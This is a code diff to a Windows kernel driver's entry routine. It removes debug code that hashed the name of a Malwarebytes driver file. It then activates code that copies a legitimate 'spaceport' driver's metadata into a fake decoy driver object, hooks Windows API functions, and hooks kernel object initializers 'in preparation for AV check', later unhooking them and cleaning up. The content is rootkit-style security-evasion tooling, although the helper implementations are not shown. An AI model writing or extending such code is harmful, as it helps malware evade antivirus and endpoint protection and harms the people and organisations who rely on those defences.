@@ -20,16 +20,7 @@ extern "C" NTSTATUS DriverEntry() {
 
 		PDRIVER_OBJECT fakeDriver{};
 
-
 		size_t size{};
-		const WCHAR* test = L"drivers\\mbam.sys"; // Note: Escaped backslash
-
-		size_t length = wcslen( test );  // length in WCHARs (not bytes)
-		auto name = hash::salted_hash_string_ci( test, length );
-
-		DbgPrint( "hash: %llx\n", name );
-		DbgPrint( "name: %ws\n", test );  // Use %ws for wide strings
-
 
 		// Init Funcion Pointer Table
 		func_pointer_table table_handle = { 0 };
@@ -40,24 +31,24 @@ extern "C" NTSTATUS DriverEntry() {
 		// Find and save pointer info for WIN-API functions
 		hooks::hook_win_API( base, size, table_handle );
 
-		//// Find and expose a legit Windows driver to copy its metadata to our dummy : Hash this too
-		//modules::get_driver_object( L"\\Driver\\spaceport", tar_obj, table_handle );
+		// Find and expose a legit Windows driver to copy its metadata to our dummy : Hash this too
+		modules::get_driver_object( L"\\Driver\\spaceport", tar_obj, table_handle );
 
-		//// Create the Fake Driver Object purely to be used as a decoy
-		//PDRIVER_OBJECT fake_obj = modules::AllocateFakeDriverObject( tar_obj, fakeDriver );
+		// Create the Fake Driver Object purely to be used as a decoy
+		PDRIVER_OBJECT fake_obj = modules::AllocateFakeDriverObject( tar_obj, fakeDriver, table_handle );
 
-		////Hook obj initializers in preperation for AV check
-		//hooks::capture_initalizer_table( base, size, table_handle, obj, 1 );
+		//Hook obj initializers in preperation for AV check
+		hooks::capture_initalizer_table( base, size, table_handle, obj, 1 );
 
 		LARGE_INTEGER delay;
 		delay.QuadPart = -10LL * 1000 * 1000 * 10; // 10 seconds
 		KeDelayExecutionThread( KernelMode, FALSE, &delay );
 
-		////Unook obj initializers in preperation for driver unload
-		//hooks::capture_initalizer_table( base, size, table_handle, obj, 0 );
+		//Unook obj initializers in preperation for driver unload
+		hooks::capture_initalizer_table( base, size, table_handle, obj, 0 );
 
-		//// Clean dummy object
-		//modules::DeallocateFakeDriverObject( fake_obj );
+		//Clean dummy object
+		modules::DeallocateFakeDriverObject( fake_obj, table_handle );
 
 		// Driver Unload
 		Logger::Print( Logger::Level::Info, "Driver Unload" );
